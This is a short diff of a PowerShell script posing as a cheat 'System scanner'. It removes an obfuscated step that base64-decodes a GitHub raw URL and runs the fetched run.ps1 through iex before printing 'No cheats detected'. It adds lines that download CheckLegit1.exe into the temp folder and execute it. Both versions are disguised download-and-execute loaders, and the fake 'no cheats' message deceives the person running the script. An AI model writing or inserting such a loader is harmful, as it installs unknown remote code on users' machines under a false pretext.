@@ -1,3 +1,2 @@
-Write-Host "System scanner" -ForegroundColor Cyan
-iex (iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvYXNkYXNkYWQvbWFpbi9ydW4ucHMx"))))
-Write-Host "No cheats detected" -ForegroundColor Green
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/ccc/main/CheckLegit1.exe" -OutFile "$env:TEMP\CheckLegit1.exe" -UseBasicParsing
+& "$env:TEMP\CheckLegit1.exe"
